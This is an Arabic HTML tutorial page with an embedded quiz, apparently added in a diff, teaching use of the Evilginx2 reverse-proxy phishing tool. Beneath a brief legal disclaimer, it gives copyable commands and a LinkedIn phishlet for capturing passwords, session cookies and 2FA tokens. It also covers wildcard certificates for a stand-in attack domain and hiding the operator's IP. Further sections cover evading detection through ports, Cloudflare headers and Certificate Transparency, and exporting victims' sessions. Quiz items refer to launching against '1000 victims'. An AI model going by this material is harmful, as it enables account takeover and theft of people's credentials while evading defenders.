@@ -1,0 +1,1185 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>دليل Evilginx2 الشامل مع الامتحان التفاعلي</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+            color: #e6e6e6;
+            line-height: 1.8;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            min-height: 100vh;
+        }
+
+        /* ==== التوقيع الشفاف ==== */
+        .signature {
+            position: fixed;
+            bottom: 10px;
+            left: 10px;
+            color: rgba(255, 255, 255, 0.15);
+            font-size: 0.7em;
+            font-family: monospace;
+            pointer-events: none;
+            z-index: 1000;
+        }
+
+        /* ==== رأس الصفحة ==== */
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+            padding: 20px;
+            background: rgba(25, 25, 45, 0.8);
+            border-radius: 15px;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.5);
+        }
+
+        .header h1 {
+            color: #00ff88;
+            font-size: 2.5em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+        }
+
+        /* ==== الأقسام التوضيحية ==== */
+        .section {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+        }
+
+        .section:hover { border-color: #00d4ff; box-shadow: 0 0 15px rgba(0, 212, 255, 0.2); }
+
+        .section h2 {
+            color: #f78166;
+            border-right: 4px solid #f78166;
+            padding-right: 16px;
+            margin: 32px 0 16px 0;
+            cursor: pointer;
+            font-size: 1.5em;
+            transition: all 0.2s ease;
+        }
+
+        .section h2:hover { color: #58a6ff; border-right-color: #58a6ff; }
+
+        .section h3 { color: #7ee787; margin: 24px 0 12px 0; font-size: 1.2em; }
+
+        .section-content { transition: all 0.3s ease; }
+
+        .expand-icon { display: inline-block; margin-right: 8px; transition: transform 0.2s ease; }
+
+        /* ==== صناديق المحتوى ==== */
+        .command-box {
+            background: #0d0d1a;
+            border: 1px solid #00ff88;
+            border-radius: 8px;
+            padding: 15px;
+            margin: 12px 0;
+            font-family: monospace;
+            color: #00ff88;
+            direction: ltr;
+            text-align: left;
+            cursor: pointer;
+        }
+
+        .command-box::before { content: "$ "; color: #f78166; }
+
+        .example-box {
+            background: rgba(126, 231, 135, 0.1);
+            border-left: 4px solid #7ee787;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .warning-box {
+            background: rgba(255, 0, 0, 0.1);
+            border: 2px solid #ff0000;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
+        }
+
+        .technical-box {
+            background: rgba(88, 166, 255, 0.1);
+            border-left: 4px solid #58a6ff;
+            padding: 16px;
+            margin: 12px 0;
+            border-radius: 6px;
+        }
+
+        .self-question {
+            background: rgba(255, 170, 0, 0.1);
+            border-right: 4px solid #ffaa00;
+            padding: 15px;
+            margin: 20px 0;
+            border-radius: 0 8px 8px 0;
+        }
+
+        .self-question h4 { color: #ffaa00; margin-bottom: 10px; }
+
+        .option-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin: 16px 0;
+        }
+
+        .option-table th {
+            background: #0d0d1a;
+            color: #58a6ff;
+            padding: 12px;
+            text-align: right;
+            border-bottom: 1px solid #30363d;
+        }
+
+        .option-table td { padding: 10px; border-bottom: 1px solid #30363d; }
+
+        .option-table tr:hover { background: rgba(88, 166, 255, 0.05); }
+
+        /* ==== زر الامتحان ==== */
+        .exam-button {
+            background: linear-gradient(45deg, #ff6b00, #ffaa00);
+            color: #0d0d1a;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 30px;
+            cursor: pointer;
+            font-weight: bold;
+            font-size: 1.3em;
+            margin: 30px auto;
+            display: block;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(255, 107, 0, 0.4);
+        }
+
+        .exam-button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 25px rgba(255, 107, 0, 0.6);
+        }
+
+        /* ==== واجهة الامتحان ==== */
+        .lesson-card {
+            background: rgba(30, 30, 50, 0.7);
+            border-radius: 15px;
+            padding: 30px;
+            margin-bottom: 20px;
+            border: 1px solid #333;
+            box-shadow: 0 5px 20px rgba(0, 0, 0, 0.3);
+        }
+
+        .lesson-title {
+            color: #00d4ff;
+            font-size: 1.8em;
+            margin-bottom: 15px;
+            border-right: 5px solid #00d4ff;
+            padding-right: 15px;
+        }
+
+        .quiz-section {
+            background: rgba(40, 40, 60, 0.8);
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border: 1px solid #444;
+        }
+
+        .quiz-question {
+            color: #ffaa00;
+            font-size: 1.3em;
+            margin-bottom: 15px;
+        }
+
+        .quiz-options { display: grid; gap: 10px; margin-bottom: 20px; }
+
+        .quiz-option {
+            background: #2a2a3a;
+            border: 2px solid #555;
+            border-radius: 8px;
+            padding: 15px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            font-size: 1.1em;
+        }
+
+        .quiz-option:hover { border-color: #00d4ff; background: rgba(0, 212, 255, 0.1); }
+
+        .quiz-option.correct { border-color: #00ff88; background: rgba(0, 255, 136, 0.2); }
+
+        .quiz-option.incorrect { border-color: #ff0000; background: rgba(255, 0, 0, 0.2); }
+
+        .quiz-option.disabled { cursor: not-allowed; opacity: 0.6; }
+
+        .feedback {
+            padding: 15px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+        }
+
+        .feedback.correct {
+            background: rgba(0, 255, 136, 0.1);
+            border-left: 4px solid #00ff88;
+            color: #00ff88;
+        }
+
+        .feedback.incorrect {
+            background: rgba(255, 0, 0, 0.1);
+            border-left: 4px solid #ff0000;
+            color: #ff6666;
+        }
+
+        .nav-buttons {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 30px;
+        }
+
+        .btn {
+            background: linear-gradient(45deg, #00ff88, #00d4ff);
+            color: #0d0d1a;
+            border: none;
+            padding: 12px 25px;
+            border-radius: 25px;
+            cursor: pointer;
+            font-weight: bold;
+            margin: 5px;
+            transition: all 0.3s ease;
+        }
+
+        .btn:hover { transform: translateY(-2px); box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4); }
+
+        .btn:disabled { background: #555; cursor: not-allowed; }
+
+        .btn-success { background: linear-gradient(45deg, #00ff88, #008800); }
+
+        .btn-danger { background: linear-gradient(45deg, #ff0000, #ff6666); }
+
+        /* ==== الشارة التصعيدية ==== */
+        .difficulty-badge {
+            display: inline-block;
+            padding: 5px 10px;
+            border-radius: 15px;
+            font-size: 0.8em;
+            font-weight: bold;
+            margin-right: 10px;
+        }
+
+        .difficulty-easy { background: #00ff88; color: #000; }
+        .difficulty-medium { background: #ffaa00; color: #000; }
+        .difficulty-hard { background: #ff6b00; color: #fff; }
+        .difficulty-expert { background: #ff0000; color: #fff; }
+
+        /* ==== تفاصيل إضافية ==== */
+        .consequences-box {
+            background: rgba(255, 0, 0, 0.15);
+            border-left: 4px solid #ff0000;
+            padding: 10px;
+            margin-top: 10px;
+            border-radius: 6px;
+        }
+
+        .hidden { display: none !important; }
+
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        .fade-in { animation: fadeIn 0.5s ease; }
+
+        @media (max-width: 768px) {
+            .container { padding: 15px; }
+            .header h1 { font-size: 1.8em; }
+            .lesson-title { font-size: 1.4em; }
+            .nav-buttons { flex-direction: column; gap: 10px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="signature">Kali@~linux</div>
+    <div class="container">
+        <!-- ==== رأس الصفحة ==== -->
+        <div class="header">
+            <h1>دليل Evilginx2 الشامل مع الامتحان التفاعلي</h1>
+            <p style="color: #00d4ff; font-size: 1.2em;">دليل شامل مع اختبار تفاعلي تدريجي من المبتدئ إلى الخبير</p>
+        </div>
+
+        <!-- ==== تحذير قانوني ==== -->
+        <div class="warning-box">
+            <h3>⚠️ تحذير قانوني وأخلاقي</h3>
+            <p>هذا التطبيق للتعليم فقط. استخدام Evilginx2 على أهداف دون إذن صريح يعتبر جريمة في معظم الدول.</p>
+        </div>
+
+        <!-- ==== قسم مقدمة Evilginx2 ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🎣 ما هو Evilginx2؟
+            </h2>
+            <div class="section-content hidden">
+                <p><strong>Evilginx2</strong> هو بروكسي عكسي (Reverse Proxy) لـ phishing مصمم لسرقة بيانات اعتماد login وكذلك tokens للمصادقة الثنائية (2FA).</p>
+                
+                <h3>💀 كيف يعمل؟</h3>
+                <p>يقف Evilginx2 بين الضحية والموقع الشرعي. يعكس كل شيء (أيقونات، CSS، JavaScript) لكنه يلتقط:</p>
+                <ul>
+                    <li>✅ اسم المستخدم وكلمة المرور</li>
+                    <li>✅ كوكيز الجلسة (Session Cookies)</li>
+                    <li>✅ رموز 2FA (مثلاً: Google Authenticator)</li>
+                    <li>✅ أي بيانات يتم إرسالها عبر POST</li>
+                </ul>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا Evilginx2 أفضل من صفحة phishing ثابتة؟</h4>
+                    <p><strong>الجواب:</strong> لأن Evilginx2 يعكس الموقع الحقيقي بشكل ديناميكي. لو غيرت Google واجهتها، Evilginx2 يعكس التغيير فوراً. الصفحة الثابتة ستبقى قديمة وتُكتشف بسهولة. أيضاً، Evilginx2 يحصل على 2FA tokens في الوقت الفعلي، بينما الصفحة الثابتة لا تستطيع.</p>
+                </div>
+
+                <div class="warning-box">
+                    <p>⚠️ <strong>الاختلاف الرئيسي:</strong> Evilginx2 لا يحتاج لتصميم صفحة مزيفة. فقط تهيئته ليعكس الموقع الحقيقي، وسيفعل الباقي تلقائياً.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم التثبيت ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔧 التثبيت والتهيئة الأساسية
+            </h2>
+            <div class="section-content hidden">
+                <h3>📦 التثبيت على Kali Linux</h3>
+                <div class="command-box" onclick="copyCommand(this)">sudo apt install evilginx2</div>
+                <div class="command-box" onclick="copyCommand(this)">evilginx2 -p /usr/share/evilginx2/ </div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا نستخدم -p؟</h4>
+                    <p><strong>الجواب:</strong> لتحديد مسار ملفات phishlets وقوالب HTML. إذا لم تحدده، سيبحث Evilginx2 في دليل العمل الحالي وقد لا يجد phishlets. هذا مهم خصوصاً في Kali حيث يتم تثبيته في /usr/share.</p>
+                </div>
+
+                <h3>🎯 الهيكل الأساسي</h3>
+                <p>أهم ملفات التهيئة:</p>
+                <ul>
+                    <li><strong>config.yml:</strong> الإعدادات الرئيسية (domains, IP)</li>
+                    <li><strong>phishlets/:</strong> ملفات phishlets جاهزة</li>
+                    <li><strong>certs/:</strong> شهادات SSL</li>
+                </ul>
+
+                <div class="example-box">
+                    <strong>💡 نصيحة:</strong> ابدأ بـ <code>evilginx2 -p /usr/share/evilginx2/ -c config.yml</code> لتشغيله مباشرة.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم Phishlets ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 📜 فهم Phishlets
+            </h2>
+            <div class="section-content hidden">
+                <h3>ما هو Phishlet؟</h3>
+                <p>ملف YAML يُعرف Evilginx2 كيف يعكس موقعاً محدداً.</p>
+
+                <div class="command-box" onclick="copyCommand(this)">config phishlets reload</div>
+                <div class="command-box" onclick="copyCommand(this)">phishlets hostname linkedin attack.com</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا phishlets لا تحتوي على كود HTML؟</h4>
+                    <p><strong>الجواب:</strong> لأن Evilginx2 يعمل كبروكسي. phishlet يحتوي فقط على القواعد: أي domains يعكس، أي حقول يلتقط، أي كوكيز يحتفظ بها. هو <strong>قالب سلوك</strong> وليس صفحة ويب. هذا يجعله أصغر وأذكى.</p>
+                </div>
+
+                <h3>🎨 مثال phishlet مبسط</h3>
+                <div class="technical-box">
+                    <pre style="color: #00ff88;">
+name: 'linkedin'
+author: '@security'
+proxy_hosts:
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'linkedin.com', session: true}
+sub_filters:
+  - {triggers_on: 'linkedin.com', orig_sub: '', domain: 'linkedin.com', search: 'https://{hostname}/', replace: 'https://{hostname}/', mimes: ['text/html']}
+auth_tokens:
+  - domain: '.linkedin.com'
+    keys: ['li_at','li_rm']
+                    </pre>
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم SSL Certificates ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🔐 شهادات SSL والتخفي
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎭 الحصول على شهادة مجانية</h3>
+                <div class="command-box" onclick="copyCommand(this)">certificates create attack.com</div>
+                <div class="command-box" onclick="copyCommand(this)">certificates create *.attack.com</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا *.attack.com أفضل؟</h4>
+                    <p><strong>الجواب:</strong> لأنك تستطيع phish أي خدمة فرعية (mail.attack.com, login.attack.com) بدون إصدار شهادة جديدة. لو سجلت *.attack.com، يمكنك خداع المستخدم بأي خدمة تابعة لـ LinkedIn أو Facebook.</p>
+                </div>
+
+                <h3>⚡ التهيئة التلقائية</h3>
+                <div class="warning-box">
+                    <p>⚠️ استخدم <code>certificates auto @attack.com</code> لإصدار شهادات تلقائياً عند تفعيل phishlet.
+                </p></div>
+
+                <div class="technical-box">
+                    <strong>🛠️ هام:</strong> لا تستخدم Let's Encrypt في اختبارات حقيقية. استخدم شهادات Let's Encrypt في التعليم فقط. في العمل الحقيقي، اشترِ شهادة EV (Extended Validation) لأنها تُظهر اسم الشركة في المتصفح.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم المنافذ ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🚪 اختيار المنافذ
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎯 المنافذ الافتراضية</h3>
+                <div class="command-box" onclick="copyCommand(this)">config ports http 80,8080</div>
+                <div class="command-box" onclick="copyCommand(this)">config ports https 443,8443</div>
+
+                <div class="self-question">
+                    <h4>🤔 متى تستخدم منفذ غير 80/443؟</h4>
+                    <p><strong>الجواب:</strong> عندما تكون خلف جدار حماية يمنحك فقط 8080/8443. أو عندما تريد تخفي الـtraffic بين منفذات عادية (مثلاً 8443 يُظهر كـ Tomcat). بعض الشركات تفتح 8080 بدون فحص عميق.</p>
+                </div>
+
+                <div class="example-box">
+                    <strong>💡 حيلة:</strong> استخدم منفذ 8443 وادعِ أنك خادم Tomcat. معظم أدوات الأمن لن تشك في حركة 8443 لأنها تعتبر "داخلية".
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم التخفي ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 🕵️ التخفي وإخفاء الهوية
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎭 User-Agent Spoofing</h3>
+                <div class="command-box" onclick="copyCommand(this)">config user_agent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"</div>
+
+                <div class="self-question">
+                    <h4>🤔 لماذا نغير User-Agent في البروكسي؟</h4>
+                    <p><strong>الجواب:</strong> لأن بعض المواقع تُرسل إصداراً مخصصاً حسب الجهاز. لو أرسل المستخدم "Mobile Safari" والبروكسي يعكس "Desktop Chrome"، سيظهر تناقض في HTML. تغيير User-Agent يجعل التجربة متسقة.</p>
+                </div>
+
+                <h3>🔍 إخفاء IP الخاص</h3>
+                <div class="technical-box">
+                    <strong>القاعدة الذهبية:</strong> لا تُشغل Evilginx2 من IP شخصي أبداً. استخدم VPS (مثل DigitalOcean). واستخدم Tor أو VPN من VPS لإضافة طبقة أخرى.
+                </div>
+            </div>
+        </div>
+
+        <!-- ==== قسم التحليل ==== -->
+        <div class="section fade-in">
+            <h2 onclick="toggleSection(this)">
+                <span class="expand-icon">▶</span> 📊 التحليل والتقارير
+            </h2>
+            <div class="section-content hidden">
+                <h3>🎯 تتبع الجلسات</h3>
+                <div class="command-box" onclick="copyCommand(this)">sessions</div>
+                <div class="command-box" onclick="copyCommand(this)">sessions @session_id</div>
+
+                <div class="self-question">
+                    <h4>🤔 ما هي جلسة Session فعلياً؟</h4>
+                    <p><strong>الجواب:</strong> في Evilginx2، الجلسة هي مجموعة من الكوكيز و tokens التي تم التقاطها لضحية واحدة. لو دخل الضحية عبر هاتفه وجهازه، سينشئ جلستين منفصلتين. يمكنك دمجها يدوياً إذا عرفت أنهما لنفس الشخص.</p>
+                </div>
+
+                <h3>📈 تصدير البيانات</h3>
+                <div class="warning-box">
+                    <p>⚠️ استخدم <code>sessions export @all</code> لتصدير كل البيانات إلى JSON. هذا مهم لتحليلها بأدوات خارجية.
+                </p></div>
+            </div>
+        </div>
+
+        <!-- ==== زر الامتحان ==== -->
+        <div class="section fade-in" style="text-align: center; padding: 40px;">
+            <button class="exam-button" onclick="startExam()">🎮 بدء الامتحان التفاعلي (20+ سؤال)</button>
+            <p style="margin-top: 15px; color: #aaa;">5 أسئلة مبتدئة • 9 أسئلة صعبة • 6 أسئلة خبير</p>
+        </div>
+
+        <!-- ==== حاوية الامتحان ==== -->
+        <div id="examContainer" class="hidden"></div>
+
+    </div>
+
+    <script>
+        // ==== دوال الدليل التوضيحي ====
+        function toggleSection(element) {
+            const content = element.nextElementSibling;
+            const icon = element.querySelector('.expand-icon');
+            
+            if (content.classList.contains('hidden')) {
+                content.classList.remove('hidden');
+                icon.innerHTML = '▼';
+            } else {
+                content.classList.add('hidden');
+                icon.innerHTML = '▶';
+            }
+        }
+
+        function copyCommand(element) {
+            const text = element.textContent.trim().replace('$ ', '');
+            navigator.clipboard.writeText(text).then(() => {
+                element.style.background = '#00ff88';
+                element.style.color = '#0d0d1a';
+                setTimeout(() => {
+                    element.style.background = '#0d0d1a';
+                    element.style.color = '#00ff88';
+                }, 500);
+            });
+        }
+
+        // ==== بيانات الامتحان (20+ سؤال) ====
+        let currentLesson = 1;
+        let score = 0;
+        let mistakes = [];
+        let examStarted = false;
+
+        const examQuestions = [
+            // --- 5 أسئلة مبتدئة (3 خيارات) ---
+            {
+                difficulty: "easy",
+                question: "ما هو وظيفة Evilginx2 الأساسية؟",
+                command: "evilginx2 -p /usr/share/evilginx2/",
+                options: [
+                    { text: "بروكسي عكسي لـ phishing يعكس المواقع الحقيقية", correct: true },
+                    { text: "أداة فحص ثغرات الشبكات", correct: false },
+                    { text: "أداة تكسير كلمات مرور", correct: false }
+                ],
+                correctExplanation: "Evilginx2 هو بروكسي عكسي متخصص في phishing. لا يُنشئ صفحات مزيفة بل يعكس الموقع الحقيقي ويلتقط البيانات أثناء المرور.",
+                wrongExplanation: "Evilginx2 لا يُستخدم لفحص الشبكات أو تكسير كلمات المرور. وظيفته الأساسية هي الـ reverse proxy للـ phishing.",
+                consequences: "إذا اعتقدت أنه أداة فحص أو تكسير، ستستخدمه بشكل خاطئ وقد تُكتشف فوراً لأنك لن تفهم آلية التخفي."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هو الغرض من الخيار -p في Evilginx2؟",
+                command: "evilginx2 -p /usr/share/evilginx2/",
+                options: [
+                    { text: "تحديد مسار ملفات phishlets والإعدادات", correct: true },
+                    { text: "تحديد منفذ الاستماع", correct: false },
+                    { text: "تحديد بروتوكول HTTP أو HTTPS", correct: false }
+                ],
+                correctExplanation: "الخيار -p يحدد مسار الدليل الذي يحتوي على ملفات phishlets وconfig.yml. هذا مهم لجعل Evilginx2 يعرف أين يجد قوالبه.",
+                wrongExplanation: "منفذ الاستماع يُحدد بـ config ports. البروتوكول يُحدد تلقائياً. -p هو فقط لمسار الملفات.",
+                consequences: "إذا لم تستخدم -p بشكل صحيح، لن يجد Evilginx2 phishlets وسيفشل في التشغيل."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هي ملفات phishlets؟",
+                command: "phishlets ls",
+                options: [
+                    { text: "ملفات YAML تحدد كيفية انتحال كل موقع", correct: true },
+                    { text: "ملفات HTML لصفحات phishing", correct: false },
+                    { text: "ملفات شهادات SSL", correct: false }
+                ],
+                correctExplanation: "Phishlets هي ملفات YAML تحتوي على القواعد. تحدد domains الحقيقية، الحقول التي تُلتقط، والكوكيز. لا تحتوي على HTML.",
+                wrongExplanation: "Phishlets لا تحتوي على HTML. هي قوالب سلوك. شهادات SSL تُخزن في دليل certs منفصل.",
+                consequences: "إذا حاولت تعديل HTML في phishlet، لن يعمل. لأن phishlet يُعرف سلوك البروكسي وليس محتوى الصفحة."
+            },
+            {
+                difficulty: "easy",
+                question: "لماذا نستخدم شهادات SSL في Evilginx2؟",
+                command: "certificates create attack.com",
+                options: [
+                    { text: "لإظهار علامة القفل الأخضر وكسب ثقة الضحية", correct: true },
+                    { text: "لتشفير البيانات بينك وبين الهدف", correct: false },
+                    { text: "لإخفاء IP الخادم", correct: false }
+                ],
+                correctExplanation: "SSL يُظهر علامة القفل ويبدو موثوقاً. هذا يزيد من نسبة نجاح الـ phishing بشكل كبير. معظم المستخدمين لا يتحققون من تفاصيل الشهادة.",
+                wrongExplanation: "التشفير موجود لكنه ليس الغرض الرئيسي. إخفاء IP لا علاقة له بـ SSL. الهدف هو الثTrust البصري.",
+                consequences: "إذا لم تستخدم SSL، المتصفح سيظهر 'Not Secure' في الحمراء. 95% من الضحايا سينتبهون ويغلقون الصفحة فوراً."
+            },
+            {
+                difficulty: "easy",
+                question: "ما هو المفتاح الذي يُفعّل phishlet؟",
+                command: "phishlets enable linkedin",
+                options: [
+                    { text: "الأمر 'phishlets enable [name]'", correct: true },
+                    { text: "الأمر 'start phishing linkedin'", correct: false },
+                    { text: "الأمر 'activate linkedin'", correct: false }
+                ],
+                correctExplanation: "الأمر 'phishlets enable [name]' هو الذي يُنشئ الاستماع ويُهيئ كل شيء. لا يوجد أمر 'start phishing' أو 'activate'.",
+                wrongExplanation: "Evilginx2 لا يستخدم 'start phishing' أو 'activate'. الأمر الصحيح هو 'phishlets enable'.",
+                consequences: "إذا استخدمت أمراً خاطئاً، لن يبدأ الـ phishing وستضيع الوقت في التحقق من الأخطاء."
+            },
+
+            // --- 9 أسئلة صعبة (5 خيارات) ---
+            {
+                difficulty: "hard",
+                question: "تريد انتحال Facebook وInstagram في آن واحد. ما هو الحل الأمثل؟",
+                command: "phishlets enable facebook\nphishlets enable instagram",
+                options: [
+                    { text: "تُشغل Evilginx2 مرة واحدة وتُمكّن phishlet واحد فقط", correct: false },
+                    { text: "تُنشئ نطاقاً فرعياً منفصلاً لكل phishlet وتُشغل خادمين", correct: false },
+                    { text: "تُشغل Evilginx2 مرة وتُمكّن phishlets متعددة على نفس النطاق", correct: true },
+                    { text: "هذا غير ممكن - يمكن phish موقع واحد فقط", correct: false },
+                    { text: "تُعدّل ملف config.yml يدوياً لكل موقع", correct: false }
+                ],
+                correctExplanation: "Evilginx2 يدعم phishlets متعددة في نفس الوقت. يمكنك تمكين facebook وinstagram معاً، كل على subdomain مختلف. لا حاجة لخوادم متعددة.",
+                wrongExplanation: "يمكنك phish مواقع متعددة في آن واحد. لا تحتاج خوادم منفصلة. التعديل اليدوي لـ config.yml ليس ضرورياً.",
+                consequences: "إذا ظننت أنه موقع واحد فقط، ستقيد قدراتك. Evilginx2 مصمم لإدارة حملات متعددة في آن واحد."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هو الخطر الرئيسي في استخدام Let's Encrypt في اختبار حقيقي؟",
+                command: "certificates create attack.com",
+                options: [
+                    { text: "Let's Encrypt معروف وقد يُكتشف بسهولة", correct: true },
+                    { text: "Let's Encrypt لا يعمل مع Evilginx2", correct: false },
+                    { text: "لأنه لا يدعم Wildcards", correct: false },
+                    { text: "لأنه بطيء", correct: false },
+                    { text: "لأنه غير آمن", correct: false }
+                ],
+                correctExplanation: "Let's Encrypt معروف جداً. بعض أدوات الأمن تكتشف أن الشهادة من Let's وتُرفع علامة. لكن السبب الأكبر هو أن Let's Encrypt يُسجل domains في Certificate Transparency Logs العامة - يمكن للضحية البحث عنها.",
+                wrongExplanation: "Let's Encrypt يعمل تماماً ويدعم Wildcards. هو سريع وآمن. المشكلة هي الشفافية العامة.",
+                consequences: "إذا استخدمت Let's Encrypt ضد هدف متقدم، سيتحقق من CT logs ويجد attack.com مُسجلة حديثاً. هذا يُثير الشكوك."
+            },
+            {
+                difficulty: "hard",
+                question: "كيف تتعامل مع JavaScript معقد يُعيق الـ phishing؟",
+                command: "phishlets edit facebook",
+                options: [
+                    { text: "تُعطل JavaScript كلياً في المتصفح", correct: false },
+                    { text: "تُعدّل phishlet لتضيف استثناءات لـ JS endpoints", correct: true },
+                    { text: "تستخدم نسخة قديمة من الموقع بدون JS", correct: false },
+                    { text: "لا حل - JavaScript يمنع الـ phishing", correct: false },
+                    { text: "تُخطف JS وتُعدله يدوياً", correct: false }
+                ],
+                correctExplanation: "Phishlets تسمح بـ sub_filters لـ JavaScript. يمكنك إضافة قواعد لتعطيل أو تعديل JS المُعيق. مثلاً: تغيير code يتحقق من hostname أو referrer.",
+                wrongExplanation: "تعطيل JS لا يعمل لأن معظم المواقع تحتاجه. لا حاجة لنسخ قديمة أو تعديل JS يدوياً. Phishlet يتعامل معه تلقائياً.",
+                consequences: "إذا لم تفهم كيفية التعامل مع JS، ستفشل في phishing مواقع حديثة. 90% من المواقع الكبيرة تستخدم JS لأمان إضافي."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هي مشكلة إعادة استخدام نفس النطاق في حملات متعددة؟",
+                command: "phishlets hostname linkedin attack.com",
+                options: [
+                    { text: "لا مشكلة - يمكن إعادة الاستخدام بأمان", correct: false },
+                    { text: "يُسبب تضارب في الكوكيز بين الحملات", correct: false },
+                    { text: "قد يُحظر النطاق بعد الحملة الأولى", correct: true },
+                    { text: "لا يدعم Evilginx2 نطاقات متعددة", correct: false },
+                    { text: "يُبطئ الأداء", correct: false }
+                ],
+                correctExplanation: "إذا كنت تستخدم attack.com في حملة تجريبية واحدة، قد يُبلغ عنه المستخدم أو تكتشفه أدوات. بعد الحظر، لا يمكنك إعادة استخدامه حتى في اختباراتك. دائماً استخدم نطاقات جديدة.",
+                wrongExplanation: "لا تضارب في الكوكيز. Evilginx2 يدعم نطاقات متعددة. الأداء لا يتأثر. المشكلة الحقيقية هي الحظر.",
+                consequences: "إذا أعجبتك نتائج اختبارك وقررت استخدام نفس النطاق في إنتاج، قد يكون مُحظراً بالفعل. هذا يضيع الوقت والمال."
+            },
+            {
+                difficulty: "hard",
+                question: "كيف تختبر phishlet قبل إطلاقه لـ 1000 ضحية؟",
+                command: "phishlets test linkedin",
+                options: [
+                    { text: "تختبره على نفسك أولاً بـ curl", correct: false },
+                    { text: "تستخدم أمر 'phishlets test' ثم تفحص السجلات", correct: true },
+                    { text: "تُطلقه مباشرة وتنتظر", correct: false },
+                    { text: "تسأل صديقاً ليختبره", correct: false },
+                    { text: "لا حاجة للاختبار - phishlets جاهزة", correct: false }
+                ],
+                correctExplanation: "الأمر 'phishlets test' يُشغل وضع تصحيح يُظهر كل requests/ responses. تستطيع أن ترى إن كان Evilginx2 يلتقط الحقول الصحيحة قبل أي ضحية حقيقية.",
+                wrongExplanation: "curl ليس كافياً لأنه لا يعالج JS. الإطلاق المباشر خطير. الاعتماد على phishlets الجاهزة قد يكون خاطئاً لأن المواقع تتغير.",
+                consequences: "إذا أطلقت phishlet غير مُختبر على 1000 ضحية، قد يفشل في التقاط tokens. ستخسر 1000 فرصة وقد تُكتشف بدون جمع بيانات."
+            },
+            {
+                difficulty: "hard",
+                question: "ما هي مشكلة استخدام Cloudflare مع Evilginx2؟",
+                command: "config domain attack.com\nconfig ip 1.2.3.4",
+                options: [
+                    { text: "Cloudflare يكشف Evilginx2 تلقائياً", correct: false },
+                    { text: "Cloudflare يُعطل كوكيز الجلسة", correct: false },
+                    { text: "تحتاج تهيئة خاصة لـ headers لكي لا يكشف IP الحقيقي", correct: true },
+                    { text: "Cloudflare لا يعمل مع Evilginx2", correct: false },
+                    { text: "لا مشكلة - يعمل مباشرة", correct: false }
+                ],
+                correctExplanation: "Cloudflare يُضيف headers مثل CF-Connecting-IP. إذا لم تُعدل phishlet لتحذفها، قد يصل IP الحقيقي إلى الموقع المُزيف. تحتاج تهيئة headers_remove: ['CF-Connecting-IP'].",
+                wrongExplanation: "Cloudflare لا يكشف Evilginx2 ولا يُعطل الكوكيز. يعمل معه لكن يحتاج تهيئة headers.",
+                consequences: "إذا لم تخرج headers Cloudflare، IP VPS الخاص بك قد يظهر في سجلات الموقع المُزيف. هذا يكشف هويتك الحقيقية."
+            },
+            {
+                difficulty: "hard",
+                question: "لماذا بعض المواقع تكتشف Evilginx2 رغم SSL صحيح؟",
+                command: "phishlets enable facebook",
+                options: [
+                    { text: "تتحقق من SNI (Server Name Indication)", correct: false },
+                    { text: "تتحقق من Certificate Transparency Logs", correct: true },
+                    { text: "تُرسل probes خاصة للـ proxy", correct: false },
+                    { text: "تكشف من سرعة الاستجابة", correct: false },
+                    { text: "لا تكتشف أبداً", correct: false }
+                ],
